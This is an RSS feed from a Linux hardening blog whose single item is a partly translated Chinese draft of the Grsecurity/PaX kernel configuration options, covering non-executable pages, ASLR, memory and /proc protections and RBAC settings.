<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Hardened GNU/Linux</title>
    <description>We are a group of free software enthusiasts, anarchists, cyber security researchers. Long live anarchy! Long live 0ld sch00l!!!
</description>
    <link>http://www.hardenedlinux.org/</link>
    <atom:link href="http://www.hardenedlinux.org/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 17 Aug 2015 15:39:00 +0800</pubDate>
    <lastBuildDate>Mon, 17 Aug 2015 15:39:00 +0800</lastBuildDate>
    <generator>Jekyll v2.5.3</generator>
    
      <item>
        <title>PaX/Grsecurity配置选项</title>
        <description>&lt;p&gt;By: Ciphergateway&lt;/p&gt;

&lt;p&gt;Wiki网址：https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options&lt;/p&gt;

&lt;h1 id=&quot;grsecurity&quot;&gt;Grsecurity配置选项&lt;/h1&gt;

&lt;p&gt;[TOC]&lt;/p&gt;

&lt;h2 id=&quot;configuration-method&quot;&gt;Configuration Method（配置选项）&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Automatic(自动配置)&lt;/strong&gt; 【使用此选项，你只需回答一些你希望如何配置内核的问题，Grsecurity和Pax将自动以此标准并按照最通用化完成配置。如果你还想定制其他标准，custom configuration自定义选项的选择同样会生效&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Custom（自定义配置）&lt;/strong&gt;【你将完全手动定制Grsecurity和Pax】&lt;/p&gt;

&lt;h4 id=&quot;usage-type&quot;&gt;Usage Type（内核用途）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Server&lt;/strong&gt; 【如果你打算将此作为一个服务器的内核】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Desktop&lt;/strong&gt; 【如果你打算将此作为一个桌面操作系统的内核】&lt;/p&gt;

&lt;h4 id=&quot;virtyalization-type&quot;&gt;Virtyalization Type（虚拟化技术类型）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;None&lt;/strong&gt; 【内核将运行在纯物理机上】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Guest&lt;/strong&gt; 【内核将被运行在虚拟机上】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Host&lt;/strong&gt; 【内核将被运行在宿主机上】&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;(X) EPT/RVI Processor Support** 【Choose this option if your CPU supports the EPT or RVI features of 2nd-gen hardware virtualization.This allows for additional kernel hardening protections to operate without additional performance impact.
To see if your Intel processor supports EPT, see: http://ark.intel.com/Products/VirtualizationTechnology (Most Core i3/5/7 support EPT)
To see if your AMD processor supports RVI, see: http://support.amd.com/us/kbarticles/Pages/GPU120AMDRVICPUsHyperVWin8.aspx】&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;( ) First-gen/No Hardware Virtualization** 【Choose this option if you use an Atom/Pentium/Core 2 processor that either doesn’t support hardware virtualization or doesn’t support the EPT/RVI extensions.】&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;virtualization-software&quot;&gt;Virtualization Software&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Xen&lt;/strong&gt; 【（GRKERNSEC_CONFIG_VIRT_XEN）Choose this option if this kernel is running as a Xen guest or host.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;VMWare&lt;/strong&gt; 【Choose this option if this kernel is running as a VMWare guest or host.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;KVM&lt;/strong&gt; 【Choose this option if this kernel is running as a KVM guest or host.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;VirtualBox&lt;/strong&gt; 【Choose this option if this kernel is running as a VirtualBox guest or host.】&lt;/p&gt;

&lt;h4 id=&quot;required-priorities-performance&quot;&gt;Required Priorities (Performance)（优先级需求）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Performance（性能优先）&lt;/strong&gt; 【选取这个选项将导致以下特性无法使用：UDEREF on a 64bit kernel, kernel stack clearing,clearing of structures intended for userland, and freed memory sanitizing】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Security（安全优先）&lt;/strong&gt; 【以上特性可用，但在最糟糕的情况下这些特性将导致20%的性能损耗】&lt;/p&gt;

&lt;h4 id=&quot;default-special-groups&quot;&gt;Default Special Groups（特殊组）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;(1001) GID exempted(被免除) from /proc restrictions&lt;/strong&gt;
【通过设定这个GID来决定那个组中的用户能够免除/proc目录下Grsecurity规则的限制，允许特殊组的用户查看网络数据、和其他用户的运行信息。这个GID也可以在开机时在内核命令行中通过“grsec_proc_gid=”设置】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(1005) GID for TPE-untrusted users(TPE:Tursted Path Execution）&lt;/strong&gt; 【该组的用户将会受到TPE的限制。如果sysctl可用，sysctl中一个名为“tpe_gid”选项将会产生】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(1006) GID for users with kernel-enforced&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;customize-configuration&quot;&gt;Customize Configuration（自定义配置）&lt;/h2&gt;

&lt;h3 id=&quot;pax&quot;&gt;PaX&lt;/h3&gt;

&lt;h4 id=&quot;enable-various-pax-features&quot;&gt;Enable various PaX features&lt;/h4&gt;

&lt;p&gt;【Pax为内核提供了防止入侵机制，从而降低了可利用的内存漏洞造成的风险】&lt;/p&gt;

&lt;h4 id=&quot;pax-control&quot;&gt;PaX Control&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Support soft mode&lt;/strong&gt; 【（PAX_SOFTMODE）允许通过soft mode(友好的方式??)运行Pax，Pax的特性将不会被强制设定为默认选项，只会在可运行时显示标记。你必须同时启用PT_PAX_FLAGS或XATTR_PAX_FLAGS支持，因为只有它们能在soft mode下标记可运行程序。	soft mode可以使用“pax_softmode=1”参数通过内核命令行在开机时激活。	此外，在运行时你可以通过/proc/sys/kernel/pax的项目控制各种Pax特性。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use legacy ELF header marking&lt;/strong&gt; 【（PAX_EI_PAX）启用这个选项将允许你通过“chpax”工具（可在http://pax.grsecurity.net 获得）控制每一个可执行程序的Pax特性。控制信息可以在otherwise reserved 的部分ELF头部（其他情况保存的部分ELF头部？？）读取。这个标记有大量的弊端（没有对soft-mode的支持、工具链不知道ELF头部的不规范用法），因此这个特性相比于PT_PAX_FLAGS and XATTR_PAX_FLAGS已经过时.		要注意的是如果你启用PT_PAX_FLAGS or XATTR_PAX_FLAG标记支持，它们会覆盖传统的EI_PAX标记。		If you enable none of the marking options then all applications will run with PaX enabled on them by default.（仅是没有PT_PAX_FLAGS or XATTR_PAX_FLAG标记支持吗？？）】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use ELF program header marking&lt;/strong&gt; 【（PAX_PT_PAX_FLAGS）启用这个选项将允许你通过“paxctl”工具（可在http://pax.grsecurity.net 获得）控制每一个可执行程序的Pax特性。控制信息可以从一个Pax特定的ELF程序头部读取。这个标记有同时支持soft-mode和完全整合toolchain。		要注意如果你同时启用了传统的EI_PAX标记支持，EI_PAX标记将被PT_PAX_FLAGS覆盖。		如果你同时启动了PT_PAX_FLAGS and XATTR_PAX_FLAGS支持，你应该确保被标记的二进制文件的标志是相同的。		If you enable none of the marking options then all applications will run with PaX enabled on them by default.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use filesystem extended attributes marking（使用文件系统的扩展属性）&lt;/strong&gt; 【（PAX_XATTR_PAX_FLAGS）启用这个选项将允许你通过“setfattr”工具控制每一个可执行程序的Pax特性。控制信息可以从文件的扩展属性user.pax.flags读取。这个标记的好处是：支持可以自检的binary-only applications（如skype）并且不能兼容chpax/paxctl的改变。	该特性主要的缺点是因为一些文件系统（如isofs, udf, vfat)不支持扩展属性，导致通过这类文件系统拷贝文件时将失去扩展属性和Pax标记。		要注意如果你同时启用了传统的EI_PAX标记支持，EI_PAX标记将被XATTR_PAX_FLAGS覆盖。	如果你同时启动了PT_PAX_FLAGS and XATTR_PAX_FLAGS支持，你应该确保被标记的二进制文件的标志是相同的。	If you enable none of the marking options then all applications will run with PaX enabled on them by default.】&lt;/p&gt;

&lt;h4 id=&quot;mac-system-integrationmacmandatory-access-control-&quot;&gt;MAC system integration（集合）（MAC，Mandatory Access Control 强制访问控制）&lt;/h4&gt;

&lt;p&gt;【MAC系统具有控制每个可执行程序Pax标志的选项。选择你特定的系统支持的方法。		NOTE: this option is for developers/integrators only.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;none&lt;/strong&gt; 【（PAX_NO_ACL_FLAGS）如果MAC系统与Pax没有联系】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;direct&lt;/strong&gt; 【（PAX_HAVE_ACL_FLAGS）如果MAC系统自行定义pax_set_initial_flags参数】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;hook&lt;/strong&gt; 【（PAX_HOOK_ACL_FLAGS）如果MAC系统使用pax_set_initial_flags_func的回调】&lt;/p&gt;

&lt;h4 id=&quot;non-executable-pages&quot;&gt;Non-executable pages（不可执行页：只允许读和写，而代码执行是被禁止的）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Enforce non-executable pages&lt;/strong&gt; 【(PAX_NOEXEC)勾选这个选项你将可以选择众多防止注入和外来代码的特性。但将使依赖原始方法（RWX权限系统???）和通过malloc()方法族动态分配内存的程序无法使用。如： XFree86 4.x server, the java runtime and wine.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Paging based non-executable pages&lt;/strong&gt; 【（PAX_PAGEEXEC）这个特性基于CPU的页特性。在没有硬件不可执行位支持的i386CPU里它是可变的，但通常带有较低的性能损耗。然而在基于Intel’s P4核心的CPU性能损耗将非常高，所有此类情况你应该禁止这个选项。对于拥有硬件不可执行位支持的CPU：alpha, avr32, ia64, parisc, sparc, sparc64, x86_64 and i386，这个特性没有性能损耗,在ppc下损耗可以忽略不计。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Emulate trampolines (模仿GCC扩展（回调？？？））&lt;/strong&gt; 【（PAX_EMUTRAMP）总有一些程序和库因为一些原因或意图去执行在禁止执行内存页中的特殊代码段，大量有名的例子是内核自己生成的信号句柄回调代码（kernel signal handler return code）和GCC trampolines。  如果你开启了CONFIG_PAX_PAGEEXEC这个特性这些进程将不能再运行。  作为补救，你可以启用这个选项并通过chpax、paxctl工具来为那些仍受到non-executable pages的保护的受影响的程序启用trampoline emulation。  在工作站(On parisc)你必须开启这个选项和EMUSIGRT，否则你的系统将无法启动！】【另外的，你可以在这里选否，并使用chpax或paxctl工具为受影响的文件禁用CONFIG_PAX_PAGEEXEC and CONFIG_PAX_SEGMEXEC特性。】【开启这个特性可能会从non-executable pages的保护中打开一个漏洞。因此最好的解决方法是不使用任何请求这个选项的文件。这可以通过不使用libc5（因为它依赖kernel signal handler return code）和不使用或重写通过GCC实现的嵌套函数的程序。  有经验的使用者可以直接修改GCC使嵌套函数不干扰Pax。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Restrict mprotect()（限制mprotect()）&lt;/strong&gt; 【(PAX_MPROTECT)启用这个特性将阻止进程进行以下操作：1、改变未被初始化为可执行的内存页的可执行状态；2、使只读的可执行页可再次写入；3、在分配的内存中创建可执行页；4、让重定位后只读的（RELRO）数据页可再次写入】【你应该启用这个特性来完善non-executable pages提供的强制保护措施.  Note:你可以使用chpax或paxctl来控制每个可执行程序的这个属性】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use legacy/compat protection demoting (read help)（使用传统/可兼容的安全措施（如RWX权限？）降低pax安全作用的影响）&lt;/strong&gt; 【（PAX_MPROTECT_COMPAT）现在的PAX_MPROTECT实现机制通过发送适当的错误代码给应用程序来阻止RWX权限分配。对于一些broken userland，Python或其他应用可能会造成问题。The current implementation however allows for applications like clamav to detect if JIT compilation/execution is allowed and to fall back gracefully to an interpreter-based mode if it does not.  While we encourage everyone to use the current implementation as-is and push upstream to fix broken userland (note that the RWX logging option can assist with this), in some environments this may not be possible. Having to disable MPROTECT completely on certain binaries reduces the security benefit of PaX,所以这个选项用来使会出现问题的这类环境恢复到old behavior】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Allow ELF text relocations (read help) (Executable and Linking Format，ELF，可执行文件)&lt;/strong&gt; 【(PAX_ELFRELOCS)Non-executable pages and mprotect()的限制对阻止新的可执行代码进入攻击任务的地址空间很有用。 There remain only two venues for this kind of attack:if the attacker can execute already existing code in the attacked task then he can either have it create and mmap() a file containing his code or have it mmap() an already existing ELF library that does not have position independent code in it and use mprotect() on it to make it writable and copy his code there.  While protecting against the former approach is beyond PaX, the latter can be prevented by having only PIC ELF libraries on one’s system (which do not need to relocate their code).&lt;em&gt;（如果攻击者可以执行在攻击任务中已存在的代码，那他可以创建它并mmap（）到一个包含他的代码的文件 或者 把它mmap（）到一个已存在的没有独立位置的代码的ELF库并且使用mprotect（）使其变得可写入并把他的代码复制进去？）&lt;/em&gt;。  如果你确定这跟你的情况相似，因为所有现代Linux发行版都有这个情况，让这个选项禁用——这里应该选否。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Enforce non-executable kernel pages&lt;/strong&gt; 【该选项相当于内核态的mprotect和pageexec。启用这个选项将使在系统区中注入和外来代码的执行更加困难。】&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Return Address Instrumentation Method
&amp;gt;bts&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;or&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;address-space-layout-randomization&quot;&gt;Address Space Layout Randomization(地址空间随机化)&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Address Space Layout Randomization&lt;/strong&gt; 【（PAX_ASLR）接下来的选项会让内核在特定的程序部分采取随机化，因此强迫攻击者在众多的情况中猜测程序的位置。在允许内核检测这类意图并回应它的前提下，任何一个失败的猜测都很可能导致被攻击的程序崩溃。启用这个选项你可以选择随机化下面的区域：1、 top of the task’s kernel stack；2、 top of the task’s userland stack；3、 base address for mmap() requests that do not specify one(this includes all libraries)；4、 base address of the main executable。强烈建议打开这个选项，因为它提供有效的保护且损失性能的可以忽略不计。  Note：可以使用chpax和paxctl控制每个可执行程序的该特性。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Randomize kernel stack base&lt;/strong&gt; 【（PAX_RANDKSTACK）启用这个选项将虚拟化每一个任务的每一个系统调用内核栈。强迫攻击者猜测，且能防止他利用可能已经泄露的信息。注意，一旦kernel stack紧缺，可能导致堆栈溢出，所以你要认真测试你的系统。  一旦在内核配置中启用这个选项，基于这个特性的文件将无法禁用这个特性。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Randomize user stack and mmap() base&lt;/strong&gt; 【（PAX_RANDUSTACK）user stack：内核随机化每一个任务的用户栈。随机化过程分为两步，第二步将采用大量的栈顶移位，从而导致程序需要大量的内存（如果SEGMEXEC未被启用将超过2.5G，如果启用了将为1.25G）。  因为这个原因，在每个基于这个特性的文件第二步可以被chpax和paxctl控制。】【（PAX_RANDMMAP）mmap，内存映射机制。如果选是，mmap()请求将不自己指定地址，内核将为之使用基于随机的地址。结果是所有动态加载的库将在一个随机的地址出现，并因此使攻击者执行library code的意图更困难。 Furthermore, if a program is relinked as a dynamic ELF file, its base address will be randomized as well, completing the full randomization of the address space layout.  攻击这样的程序将变成一个猜测游戏。】&lt;/p&gt;

&lt;h4 id=&quot;miscellaneous-hardening-features&quot;&gt;Miscellaneous hardening features(杂项优化）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Sanitize all freed memory （清除已释放内存）&lt;/strong&gt; 【一旦内存被释放，内核将清除内存页和slab对象（Linux下的一种内存分配机制）。这可以轮流减少存储数据的生命周期，避免密码等敏感数据在内存太长时间。对运行时间短的进程尤其有好处。作为交易，这可能对性能有所影响，部署该选项前最好在工作负荷下测试一下性能损失。要注意这个特性不会保护存储在仍然存活的内存页中的数据】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sanitize kernel stack&lt;/strong&gt; 【内核将在系统调用返回前清除内核栈。这同样会造成性能损耗，最好在工作环境下测试一下。完整的特性需要GCC插件的支持，例如GCC4.5或更新的版本。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Forcibly initialize local variables copied to userland(对复制到用户态的局部变量进行强制初始化)&lt;/strong&gt; 【内核将对一些被复制到用户态的局部变量进行0初始化操作】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prevent invalid userland pointer dereference（阻止间接引用不合法的用户态指针）&lt;/strong&gt; 【在只允许内核指针的环境下内核将阻止间接引用用户态指针。作为交换，一些虚拟化措施将遭受到可观的延迟，因此如果内核将运行在这类环境上你应该禁用这个特性。一个给定虚拟环境是否会受到影响最好通过一些简单的测试再决定。性能损耗将会在开机的时候最为明显。一个重要的准则是虚拟机运行在没有硬件虚拟化支持的CPU上会很可能遭到这类延迟。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prevent various kernel object reference counter overflows(阻止各类内核对象引用计数器溢出)&lt;/strong&gt; 【内核会检查并阻止溢出的各类（但不是全部）对象引用计数器。作为交易，被溢出引用计数机制保护的数据结构将不会被释放，从而导致内存泄露。需要注意到的是即使没有这种保护，这种泄露也会发生。但是那样的话，泄露出的大量数据会最终引发数据结构的freeing（//解释为内存释放还是数据自由？）, 即使这种数据结构正在被用于别处的时候。这会最终导致这个特性所阻止的可利用的情况的发生。鉴于该特性对性能损耗微乎其微，建议启用这个特性】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Automatically constify eligible structures （自动常量化符合条件的结构)&lt;/strong&gt; 【the compiler will automatically constify a class of types that contain only function pointers.它减少了内核的受攻击面并产生了更好的内存配置。此特性需要GCC4.5及以上。要注意的是，如果一些代码不得不修改已常量化的变量，那源代码将作为补丁才能被使用。 Examples can be found in PaX itself (the no_const attribute) and for some out-of-tree modules at http://www.grsecurity.net/~paxguy1/ .】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Harden heap object copies between kernel and userland （加固用户与内核之间堆对象的拷贝）&lt;/strong&gt; 【内核会限制堆对象的大小，当它们被在内核态和用户态之间的目录拷贝时。这种检查防止在内核向用户拷贝时造成内核堆的信息泄露，并且防止在用户向内核拷贝时造成内核堆溢出。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prevent various integer overflows in function size parameters&lt;/strong&gt; 【选择这个选项内核会重新计算被标记为size_overflow特征的具有双精度整数的函数参数的表达式。The recomputed argument is checked against TYPE_MAX and an event is logged on overflow and the triggering process is killed.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Generate some entropy during boot and runtime （在开机和运行时生成一些无序状态量（平均信息量））&lt;/strong&gt; 【选择这个选项内核会利用某些内核代码从原始以及手动产生的程序状态中提取无序状态量This will help especially embedded（嵌入式） systems where there is little ‘natural’ source of entropy normally. The cost is some slowdown of the boot process and fork（分岔） and irq（中断请求） processing.注意这个提取entropy的方法不是密码级别的安全】&lt;/p&gt;

&lt;h3 id=&quot;memory-protections&quot;&gt;Memory Protections（内存保护）&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Deny reading/writing to /dev/kmem, /dev/mem, and /dev/port&lt;/strong&gt; 【（GRKERNSEC_KMEM）如果你启用这个选项，在运行的内核上/dev/kmem和/dev/mem将无法读写，/dev/port也将不允许被打开。/dev/cpu/*/msr和kexec的支持将被删除。If you have module support disabled, enabling this will close up six ways that are currently used to insert malicious code（恶意代码） into the running kernel.就算这个特性被启用，我们依然高度建议你使用RBAC系统，因为攻击者仍然可能通过先为人知的代码修改运行的内核。启用这个选项会阻止cpupower和powertop工具的运行。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disable privileged I/O&lt;/strong&gt; 【（相关参数：kernel.grsecurity.disable_priv_io）启用这个选项，所有ioperm和iopl调用都会返回error。不幸的是一些程序需要这个通道来正确地运行，最著名的是XFree86 and hwclock。hwclock可以通过内核的RTC（real-time clock)支持补救，所以如果这个选项启用，那RTC也将可用，用来保证hwclock正确运行。如果你正使用XFree86或Xorg2012或更早的版本，你可能导致无法使用图形界面，在这种情况下你应该使用RBAC系统。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Harden BPF JIT against spray attacks&lt;/strong&gt; 【（GRKERNSEC_JIT_HARDEN）？？？】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disable unprivileged PERF_EVENTS usage by default&lt;/strong&gt; 【sysctl中的/proc/sys/kernel/perf_event_paranoid取值范围将被允许扩大，并且的得到一个新的默认值3。当sysctl被设置成这个值时，对PERF_EVENTS系统调用接口没有权限的使用将被允许。虽然PERF_EVENTS能被合法地用来管理性能和低等级应用分析，但是这建立在强制忽略配置上，是一些漏洞的错误所在，也为边缘途径和信息泄露产生新的机会。这个特性将PERF_EVENTS设置为一个默认的安全状态，并且如果有不具备权限的程序分析需要，允许管理员暂时更改它的值。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Insert random gaps between thread stacks（在线程栈中插入随机间隙）&lt;/strong&gt; 【（GRKERNSEC_RAND_THREADSTACK）一个随机大小的间隙将会强制插入已分配的线程栈中。Glibc’s NPTL and other threading libraries that pass MAP_STACK to the kernel for thread stack allocation are supported.这个implements目前为间隙提供8位的平均信息。Many distributions do not compile threaded remote services with the -fstack-check argument to GCC, causing the variable-sized stack-based allocator, alloca(), to not probe the stack on allocation. 这将允许一个无界限alloca()来跳过所有保护页面，潜在并有把握地修改其他的线程栈。一个强制随机的间隙可以降低这类攻击的可靠性and increases the chance that such a read/write to another thread’s stack instead lands in an unmapped area,导致崩溃并触发Grsecurity的anti-bruteforcing（反暴力破解）逻辑。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Harden ASLR against information leaks and entropy reduction （加强ASLR来抵御信息泄露和平均状态量减少）&lt;/strong&gt; 【（GRKERNSEC_PROC_MEMMAP）如果启用这个特性，并且Pax中的依赖随机地址特性在任务中被启用，那/proc//maps和/proc//stat文件将不再给出地址映射信息。另外还将清除这些信息并禁用那些危险源的信息。this option causes reads of sensitive /proc/ entries（条目） where the file descriptor（描述子） was opened in a different task than the one performing the read.这类意图将会被记录。This option also limits argv/env strings for suid/sgid binaries to 512KB to prevent a complete exhaustion of the stack entropy provided by ASLR. Finally, it places an 8MB stack resource limit on suid/sgid binaries to prevent alternative mmap layouts from being abused.】【如果你使用Pax，启用这个选项至关重要，因为它关闭了许多让完整的ASLR局部失效的漏洞】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prevent kernel stack overflows&lt;/strong&gt; 【（GRKERNSEC_KSTACKOVERFLOW）内核的进程栈将使用vmalloc来进行分配，而不是内核默认的分配器。This introduces guard pages that in combination with the alloca checking of the STACKLEAK feature prevents all forms of kernel process stack overflow abuse.要注意这个特性与内核栈缓存溢出不一样.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deter exploit bruteforcing（阻止利用暴力破解）&lt;/strong&gt; 【（GRKERNSEC_BRUTE， kernel.grsecurity.deter_bruteforce）启动这个选项，尝试暴力破解分支后台进程如apche和sshd以及suid/sgid下的二进制文件的意图都会被阻止。当一个forking deamon的子进程被Pax或因为一个不合法的操作或其他可疑信号杀死、崩溃时，（the parent process will be delayed 30 seconds upon every subsequent fork）父进程将在之后的每个分支延迟30秒，直到管理员能评定这个情况并重启这个后台程序。 在suid/sgid方面，这个意图会被记录，the user has all their existing instances of the suid/sgid binary terminated，并在15分钟内不能执行任何suid/sgid的二进制程序。 建议你在审计部分开启信号记录使得每当进程触发可疑信号时就生成记录。 如果sysctl选项可用，一个名为”deter_bruteforce”的选项会被生成。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Harden module auto-loading（模板自动加载的加固）&lt;/strong&gt; 【（GRKERNSEC_MODHARDEN）module auto-loading in response to use of some feature implemented by an unloaded module will be restricted to root users。Enabling this option helps defend against attacks by unprivileged users who abuse（滥用） the auto-loading behavior to cause a vulnerable（有漏洞的） module to load that is then exploited. 如果这个选项阻止了非root用户合理的自动加载，管理员可以通过使用警告日志中提到的准确的模块的名字手动执行模块。另外，管理员可以通过修改init脚本添加模块到开机模块加载列表中去。 拥有加密home目录支持的ubuntu服务器可能更需要对init脚本的修改，as the first non-root user logging in will cause the ecb(aes), ecb(aes)-all, cbc(aes), and cbc(aes)-all modules to be loaded.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hide kernel symbols&lt;/strong&gt; 【（GRKERNSEC_HIDESYM）启用这个选项，users with CAP_SYS_MODULE通过系统调用从已加载的模块中获得信息和显示所有内核标志的操作将被限制。由于软件的兼容性的原因，root用户对/proc/kallsyms目录将会被限制。RBAC系统将会隐藏entry（条目？入口？），即使是针对root用户。 该选项同样通过/proc一些条目防止内核地址的泄露。 要注意，当且仅当遇到下列情况时，该选项才会起作用：1、内核正使用的Grsecurity没有被一些发行版预先编译过了；2、你还应该同时启用了GRKERNSEC_DMESG特性；3、你正使用RBAC系统并且隐藏其他文件，例如kernel image and System.map。除此之外，启用这个选项将获得在编译时改变/boot, /lib/modules, and the kernel source这些目录的许可，以防止非root用户查看。如果以上的情况都符合，这个选项将有助于对局部内核可利用溢出和任意读写漏洞（local kernel exploitation of overflows and arbitrary read/write vulnerabilities）提供有用的保护。 强烈建议你再此之外启用GRKERNSEC_PERF_HARDEN特性】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Randomize layout of sensitive kernel structures （敏感内核结构的随机配置）&lt;/strong&gt; 【（GRKERNSEC_RANDSTRUCT）许多敏感内核结构（如task, fs, cred, etc)和all structures composed entirely of function pointers (aka “ops” structs)的配置将在编译的时候被随机化。This can introduce the requirement of an additional infoleak vulnerability for exploits targeting these structure types.		使用这个选项会产生一些性能损耗，轻微地增加内存使用，并且阻止取证工具（forensic tools）如Volatility的使用（除非内核资源树在内核安装完后没有清除。		编译的种子放在tools/gcc/randomize_layout_seed.h中。这在一个允许的make clean命令后会保留下来，用来使用先用的种子来编译external modules，并且可以通过make mrproper或make distclean被删除。】&lt;/p&gt;

&lt;p&gt;**Use cacheline-aware structure randomization ** 【（GRKERNSEC_RANDSTRUCT_PERFORMANCE）If you say Y here, the RANDSTRUCT randomization will make a best effort at restricting randomization to cacheline-sized groups of elements. It will further not randomize bitfields in structures. This reduces the performance hit of RANDSTRUCT at the cost of weakened randomization.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Active kernel exploit response&lt;/strong&gt; 【（GRKERNSEC_KERN_LOCKOUT）启用这个选项，当一个Pax警告触发，原因是可疑的内核活动(from KERNEXEC/UDEREF/USERCOPY)或因为bad memory accesses导致一个OOPS（错误？？）发生，我们将使用一下两个措施中的一个，而不是直接终止攻击进程(and potentially allowing a subsequent（后来的） exploit from the same user)：1如果用户是root，we will panic the system；2、如果用户不是root，我们会记录这个行为，终止该用户的所有进程，然后在系统重启前阻止他们创建任何新进程。This deters repeated kernel exploitation/bruteforcing attempts and is useful for later forensics.】&lt;/p&gt;

&lt;h3 id=&quot;role-based-access-control-options&quot;&gt;Role Based Access Control Options&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Disable RBAC system&lt;/strong&gt; 【（GRKERNSEC_NO_RBAC）如果这里选是，/dev/grsec策略将从内核中删除，来阻止RBAC系统生效。		应该仅在你不打算使用RBAC时才选Yes，以防止当可加载的模块支持并且/dev/[k]mem已被锁定时，攻击者通过错误使用的RBAC系统使用root权限来隐藏文件或进程。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hide kernel processes&lt;/strong&gt; 【（GRKERNSEC_ACL_HIDEKERN）如果这里选是，除了有”view hidden processes”标志的subject，所有内核线程将对所有进程隐藏。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;() Maximum tries before password lockout （最大密码尝试次数）&lt;/strong&gt; 【（GRKERNSEC_ACL_MAXTRIES）这个选项强制设定用户在Grsecurity RBAC系统中认证自己的最大次数，超过特定次数将被拒绝再次认证。数字越小，密码越难被暴力破解。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;() Time to wait after max password tries, in seconds&lt;/strong&gt; 【（GRKERNSEC_ACL_TIMEOUT）这个选项指定用户在RABC系统认证失败达最大次数后必须等待的时间。数字越大，密码越难被暴力破解。】&lt;/p&gt;

&lt;h3 id=&quot;filesystem-protections&quot;&gt;Filesystem Protections&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Proc restrictions&lt;/strong&gt; 【（GRKERNSEC_PROC）如果选是，/proc文件系统的访问权限将会改变，以加强系统安全和隐私。你必须在用户限制和用户及用户组限制中选择一个。根据你的选择，你可以把用户限制在只能查看自己运行的进程，或choose a group that can view all processes and files normally restricted to root if you choose the “restrict to user only” option. 		注意，如果你以非root身份运行identd或者ntpd（网络时间校正协议(network time protocol daemon)），你必须在你指定的组里运行。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Restrict /proc to user only&lt;/strong&gt; 【（GRKERNSEC_PROC_USER）如果选是，非root用户将只能查看他们自己的进程，并且会被禁止查看网络相关的信息、内核标志和模块信息。】&lt;/p&gt;

